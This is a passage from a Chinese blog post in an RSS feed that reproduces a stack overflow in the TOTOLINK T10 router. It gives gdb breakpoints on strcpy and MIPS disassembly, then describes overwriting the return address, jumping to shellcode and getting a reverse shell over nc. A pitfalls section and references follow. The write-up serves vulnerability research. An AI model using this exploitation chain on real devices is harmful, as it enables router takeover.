class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ida中看到&lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;的地址是&lt;span class=&#34;number&#34;&gt;00003418&lt;/span&gt;, 于是下断点在&lt;span class=&#34;number&#34;&gt;0x778ec000&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x0003418&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0x778ef418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b *&lt;span class=&#34;number&#34;&gt;0x778ef418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此外,为了更好的查看覆盖返回地址情况&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以在开头再下一个断点,     sw      $ra, &lt;span class=&#34;number&#34;&gt;0xD0&lt;/span&gt;+var_s24($sp) 这个是存放返回地址的指令,放在$ra寄存器里&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000329&lt;/span&gt;C                 li      $gp, (_fdata+&lt;span class=&#34;number&#34;&gt;0x7FF0&lt;/span&gt; - .)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000032&lt;/span&gt;A4                 addu    $gp, $t9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000032&lt;/span&gt;A8                 addiu   $sp, &lt;span class=&#34;number&#34;&gt;-0xF8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000032&lt;/span&gt;AC                 sw      $ra, &lt;span class=&#34;number&#34;&gt;0xD0&lt;/span&gt;+var_s24($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;以及下断点到最后,查看最后劫持返回地址的效果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000034&lt;/span&gt;C4                 jr      $ra&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后c继续执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;由于第一次进行&lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;会会进行&lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;动态链接的符号解析等等,而且gdb中不知道为什么finish等不能用,所以先随便发点东西,不触发漏洞,在第二次运行时,再触发漏洞,具体查看&lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;的过程( 非常容易打挂...调试了很多次)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这四行代码是复制语句,将输入复制到栈上,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163515070.png&#34; alt=&#34;image-20230514163515070&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		复制成功后,看到已经把返回地址修改了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163617803.png&#34; alt=&#34;image-20230514163617803&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		0x4143b4就是shellcode的开始&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163647722.png&#34; alt=&#34;image-20230514163647722&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		返回处 跳到shellcode	开始执行	&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163708915.png&#34; alt=&#34;image-20230514163708915&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		获取反弹shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163745190.png&#34; alt=&#34;image-20230514163745190&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;7-3-3-遇到的坑&#34;&gt;&lt;a href=&#34;#7-3-3-遇到的坑&#34; class=&#34;headerlink&#34; title=&#34;7.3.3 遇到的坑&#34;&gt;&lt;/a&gt;7.3.3 遇到的坑&lt;/h4&gt;&lt;p&gt;​		刚开始调试的时候,发现怎么也弹不回shell,(在mac上开的nc,后来发现其实链接已经建立了,),调试了好久&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514162741686.png&#34; alt=&#34;image-20230514162741686&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		其实已经收到了shell,但是没有提示显示….&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514164256153.png&#34; alt=&#34;image-20230514164256153&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;八、参考&#34;&gt;&lt;a href=&#34;#八、参考&#34; class=&#34;headerlink&#34; title=&#34;八、参考&#34;&gt;&lt;/a&gt;八、参考&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/&#34;&gt;https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zone.huoxian.cn/d/2676-totolink-cve-2022-25084&#34;&gt;https://zone.huoxian.cn/d/2676-totolink-cve-2022-25084&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.52pojie.cn/thread-1715223-1-1.html&#34;&gt;https://www.52pojie.cn/thread-1715223-1-1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/gtrboy/totolink&#34;&gt;https://github.com/gtrboy/totolink&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SeppPenner/mqttfx171-backup/tree/master/Binaries&#34;&gt;https://github.com/SeppPenner/mqttfx171-backup/tree/master/Binaries&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://web.archive.org/web/20220504092050/http://www.jensd.de/apps/mqttfx/1.7.1/&#34;&gt;https://web.archive.org/web/20220504092050/http://www.jensd.de/apps/mqttfx/1.7.1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://mqttfx.jensd.de/index.php/download&#34;&gt;https://mqttfx.jensd.de/index.php/download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/dong__ge/article/details/126322091&#34;&gt;https://blog.csdn.net/dong__ge/article/details/126322091&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/m0_43406494/article/details/124815879&#34;&gt;https://blog.csdn.net/m0_43406494/article/details/124815879&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
